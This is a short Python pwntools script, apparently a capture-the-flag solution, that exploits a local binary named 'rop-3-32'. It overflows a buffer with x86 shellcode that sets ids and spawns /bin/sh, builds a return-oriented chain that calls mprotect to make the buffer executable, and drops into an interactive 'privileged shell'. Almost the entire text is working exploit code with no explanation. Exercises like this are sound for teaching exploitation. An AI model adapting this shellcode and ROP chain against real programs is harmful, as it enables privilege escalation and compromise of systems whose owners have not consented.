from pwn import *

SHELLCODE ='\xb8\xca\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x80\x89\xc3\x89\xc1\xb8\xcc\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x801\xc0Phn/shh//bi\x89\xe31\xc91\xd2\xb8\x1b\x11\x11\x11\xc1\xe0\x1c\xc1\xe8\x1c\xcd\x80'

GARB = 'bbbb'

# Addresses needed for the attack
mprotect_addr = ELF('./rop-3-32').symbols['mprotect']
gbuf_addr = 0x804a060 # Address of g_buf in the program code
gbuf_alligned_addr = 0x804a000 # Address of g_buf page aligned

inp = SHELLCODE + ('a' * (0x98- len(SHELLCODE))) + GARB + p32(mprotect_addr) + p32(gbuf_addr) + p32(gbuf_alligned_addr) + p32(0x1000) + p32(7)

# Launch processs and send rop chain
p = process('./rop-3-32')

# send attack
p.send(inp)

# Use privilleged shell to get the flag
p.interactive()
